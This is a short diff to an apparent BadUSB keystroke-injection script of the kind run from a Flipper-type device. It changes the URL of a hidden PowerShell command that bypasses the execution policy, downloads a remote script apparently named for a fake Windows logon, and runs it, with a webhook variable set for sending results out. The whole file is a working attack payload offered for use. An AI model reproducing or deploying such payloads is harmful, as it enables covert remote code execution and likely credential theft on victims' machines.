@@ -4,5 +4,5 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $dc='webhook_here';irm https://raw.githubusercontent.com/mbeskek/flips/main/windows-10-logon.ps1 | iex
+STRING powershell -NoP -Ep Bypass -W H -C $dc='webhook_here';irm https://raw.githubusercontent.com/mbeskek/flips/main/Scripts/windows-10-logon.ps1 | iex
 ENTER
